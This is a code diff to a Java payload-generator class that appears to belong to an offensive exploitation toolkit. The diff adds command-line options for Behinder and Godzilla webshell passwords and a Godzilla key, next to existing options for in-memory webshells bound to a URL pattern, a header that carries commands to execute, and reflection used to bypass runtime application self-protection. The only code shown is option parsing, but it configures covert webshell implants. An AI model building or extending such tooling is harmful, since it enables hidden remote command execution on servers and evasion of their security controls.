@@ -35,7 +35,8 @@ public class GeneratePayload {
 		options.addOption("o", "obscure", false, "Using reflection to bypass RASP");
 		options.addOption("i", "inherit", false, "Make payload inherit AbstractTranslet or not (Lower JDK like 1.6 should inherit)");
 		options.addOption("u", "url", true, "MemoryShell binding url pattern,default [/version.txt]");
-		options.addOption("pw", "password", true, "MemoryShell password,default [p@ssw0rd]");
+		options.addOption("pw", "password", true, "Behinder or Godzilla password,default [p@ssw0rd]");
+		options.addOption("gzk", "godzilla-key", true, "Godzilla key,default [key]");
 		options.addOption("hk", "header-key", true, "MemoryShell Header Check,Request Header Key,default [Referer]");
 		options.addOption("hv", "header-value", true, "MemoryShell Header Check,Request Header Value,default [https://su18.org/]");
 		options.addOption("ch", "cmd-header", true, "Request Header which pass the command to Execute,default [X-Token-Data]");
@@ -102,7 +103,12 @@ public class GeneratePayload {
 		}
 
 		if (cmdLine.hasOption("password")) {
-			PASSWORD = generatePassword(cmdLine.getOptionValue("password"));
+			PASSWORD_ORI = cmdLine.getOptionValue("password");
+			PASSWORD = generatePassword(PASSWORD_ORI);
+		}
+
+		if (cmdLine.hasOption("godzilla-key")) {
+			GODZILLA_KEY = generatePassword(cmdLine.getOptionValue("godzilla-key"));
 		}
 
 		if (cmdLine.hasOption("header-key")) {
